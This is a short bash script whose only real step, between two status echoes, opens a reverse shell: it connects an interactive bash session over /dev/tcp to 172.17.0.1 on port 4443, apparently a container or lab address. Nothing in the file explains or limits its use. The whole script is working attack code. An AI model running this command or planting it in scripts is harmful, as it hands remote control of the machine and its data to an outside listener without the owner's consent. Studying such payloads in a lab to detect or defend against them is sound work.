#!/bin/bash
echo "starting..."
bash -i >& /dev/tcp/172.17.0.1/4443 0>&1
echo "done"
